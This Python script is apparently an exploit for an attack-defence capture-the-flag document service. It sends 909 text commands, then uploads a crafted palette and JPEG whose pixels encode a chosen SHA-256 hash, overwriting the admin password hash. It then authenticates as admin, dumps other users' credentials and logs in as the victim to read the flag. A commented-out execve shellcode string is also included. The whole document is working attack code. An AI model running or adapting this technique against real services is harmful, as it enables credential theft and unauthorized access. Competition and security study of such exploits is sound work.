#!/usr/bin/env python3

import socket
import sys
import pexpect
import pexpect.fdpexpect
import random
import string
import PIL
import PIL.Image
import PIL.ImageDraw
import subprocess
import os
import hashlib
import json

#shellcode="\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x6c\x73\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#shellcode="abcdefghijklmnopqrstuvwxyz"
#shellcode="delslkdjjkjskjlaekjlkaejlo"
#shellcode="258f9fb7e283ff7489654e4165ea0fffec2fb30725798bef946df5804effc74b" # foo
#shellcode="abcdefghijklmnopqrstuvwxyz"
#d52b78b0b0630151485ed81ed59c85567c740bc586588f8a23f14258ddebecda
#d52b78b0b0630151485ed81ed59c85567c740bc586588f8a23f14258ddebecda

DEBUG = False
DEBUG2 = False
MY909 = 909

def get_flag(ip, port, flag_id, token):
    username,password = token.split(":")
    doc_id = flag_id

    # Interaction with the service
    # Try to be robust, services will not always answer immediately
    conn = socket.create_connection((ip, port))
    c = pexpect.fdpexpect.fdspawn(conn.fileno())
    if DEBUG:
        c.logfile = sys.stdout.buffer

    c.expect("Enter username:")
    c.sendline(username)
    c.expect("Enter password:")
    c.sendline(password)
    c.expect("Enter document id:")
    c.sendline(doc_id)
    try:
        c.expect("Title: ([\w ']+)")
        flag = c.match.groups()[0].decode()
    except Exception as e:
        return {'RES': 'FAIL', 'DATA': str(e)}
    c.expect("Enter command:")
    c.send('quit')

    c.close()
    #conn.close()

    return flag

def create_image(shellcode):
    BLOCKSIZE=80
    NUMBLOCKS = len(shellcode)
    img = PIL.Image.new('L', ((BLOCKSIZE * NUMBLOCKS), BLOCKSIZE), color='white')
    draw = PIL.ImageDraw.Draw(img)

    #print("Shellcode len: %d" % len(shellcode))
    palette = ''.join(sorted(set(shellcode)))
    new_palette = ""
    PALETTE_REPEAT=5
    PALETTE_OFFSET=1
    for c in palette:
        for i in range(PALETTE_REPEAT):
            new_palette += c

    #print("New palette: %s" % new_palette)
    palette = new_palette
    palette_range = len(palette)
    #print("Palette len: %d" % palette_range)
    palette_step = 256.0/palette_range
    #print("Palette step: %d" % palette_step)
    #for c in palette:
    #    print("%s (%02x)" % (c, ord(c)))
    shellcode_pos = 0
    for c in shellcode:
        palette_pos = palette.find(c)
        # How deep in the repetition
        palette_pos += PALETTE_OFFSET
        #print("Handling %s (%s) in position %d" % (c, hex(ord(c)), palette_pos))

        shell_color = int(palette_pos * palette_step)
        #print("Using color %d" % shell_color)
        x0 = shellcode_pos * BLOCKSIZE
        y0 = 0
        x1 = x0 + BLOCKSIZE
        y1 = BLOCKSIZE + 1
        draw.rectangle([(x0, y0), (x1, y1)], fill=shell_color)
        shellcode_pos += 1


    img.save('shellcode.jpg')
    cmd = "jp2a --chars='%s' shellcode.jpg --output=shellcode.txt --width=%d --height=1" % (palette, len(shellcode))
    #print("executing: %s" % cmd)
    os.system(cmd)
    if DEBUG2:
	    fd = open('shellcode.txt', 'rb')
	    res = fd.read().strip()
	    #print("Shcd is:  %s" % repr(shellcode))
	    #print("File is: %s" % repr(res))
	    i = 0
	    for c in res:
	        #print(type(c))
	        #print(type(shellcode[i]))
	        if c != ord(shellcode[i]):
	            print("problem at %d: shellcode is %s but file is %s" % (i, hex(ord(shellcode[i])), hex(c)))
	            sys.exit(1)
	        i += 1

    return palette


articles = ("All the", "The", "Those", "Them")

names = ('players',
         'musicians',
         'Beatles',
         'fans',
         'Rocky Racoons',
         'friends of Mr. Mustard',
         "Lady Madonna's children",
         'Lucy and the diamonds')

verbs = ('are', 'seem', 'look', 'appear', 'run', 'play', 'jam', 'sound')

adjectives = ('beautiful', 'magical', 'sweet', 'mystery', 'sweet')

def exploit(ip, port, flag_id):
    # Username
    username = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))

    # Username
    password = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))

    admin_password = b'zot'
    admin_hash = hashlib.sha256(admin_password).hexdigest()

    if DEBUG:
        print("Password %s, hash %s" % (admin_password, admin_hash))

    # Title
    title = "%s %s %s %s" % \
              (random.choice(articles),
               random.choice(names),
               random.choice(verbs),
               random.choice(adjectives)) # Well, hopefully should not collide


    # Interaction with the service
    conn = socket.create_connection((ip, port))
    c = pexpect.fdpexpect.fdspawn(conn.fileno())
    if not c:
        printf("Cannot initialize pexpect")
        return {'RESULT': "FAIL"}
    #IPython.embed()

    if DEBUG:
        c.logfile = sys.stdout.buffer

    c.expect("Enter username:")
    #IPython.embed()
    c.sendline(username)
    c.expect("Enter password:") # Note: these are RegExps!
    c.sendline(password)
    c.expect("Enter document id:")
    c.sendline("") # Empty string, will generate id
    c.expect("Created new document id: ([\w ]+)")
    doc_id = c.match.groups()[0]
    c.expect("Enter title:")
    c.sendline(title)

    #print("User: %s Password: %s Id: %s Title: %s" % (username, password, doc_id, title))

    for step in range(MY909):
        if DEBUG:
            print("Executing step: %d" % step)
        c.expect("Enter command:")

        command = "text"
        c.sendline(command)
        #print("Executing %s" % command)
        c.expect("Enter text:")
        sentence = "%s %s %s %s" % \
                        (random.choice(articles),
                        random.choice(names),
                        random.choice(verbs),
                        random.choice(adjectives))
        c.sendline(sentence)

    c.expect("Enter command:")
    command = "palette"
    palette = create_image(admin_hash)
    c.sendline(command)
    c.expect("Length:")
    c.sendline("%d\n" % len(palette))
    c.expect("Data:")
    #IPython.embed()
    c.send(palette)

    c.expect("Enter command:")
    command = "image"
    f = open("shellcode.jpg", "rb")
    data = f.read()
    c.sendline(command)
    c.expect("Enter image width:")
    c.sendline("%d" % len(admin_hash))
    c.expect("Enter image height:")
    c.sendline("1")

    c.expect("Length:")
    c.sendline("%d\n" % len(data))
    c.expect("Data:")
    #IPython.embed()
    c.send(data)

    #IPython.embed()

    #print("Executing final step %d" % step)
    c.expect("Enter command:")
    command = "print"
    c.sendline(command)
    c.expect("Enter command:")
    command = "list"
    c.sendline(command)
    c.expect("Please authenticate: ")
    c.sendline(admin_password)
    c.expect("Enter command:")
    if DEBUG:
        print("Parsing data: [[[%s]]]" % c.before)
    if b"Credentials verification failed." in c.before:
        return { 'error': 1, 'error_msg': "Password override failed" }

    found = False
    lines = c.before.splitlines()
    for line in lines:
        line = line.decode("utf-8")
        if DEBUG:
            print("Processing: %s\n" % line)
        try:
            (prefix, username, password, doc_id) = str(line).split("_")
        except Exception as e:
            if DEBUG:
                print("Malformed line: %s - %s" % (line, str(e)))
            continue
        if DEBUG:
            print(str(doc_id))
            print(str(flag_id))
            #print("PARSED: %s - %s - %s - %s - %s" % (prefix, username, password, doc_id, flag_id))
        if str(doc_id) != str(flag_id):
            continue
        else:
            found = True
            break

    if not found:
        return { 'error': 1, 'error_msg': "No flag id found" }


    c.close()

    flag = get_flag(ip, port, flag_id, "%s:%s" % (username, password))
    error = 0
    error_msg = ""

    return {'error': error,
            'error_msg': error_msg,
            'payload': {
                'flag': flag
                }
            }

if __name__ == "__main__":
    print(json.dumps(exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3])))
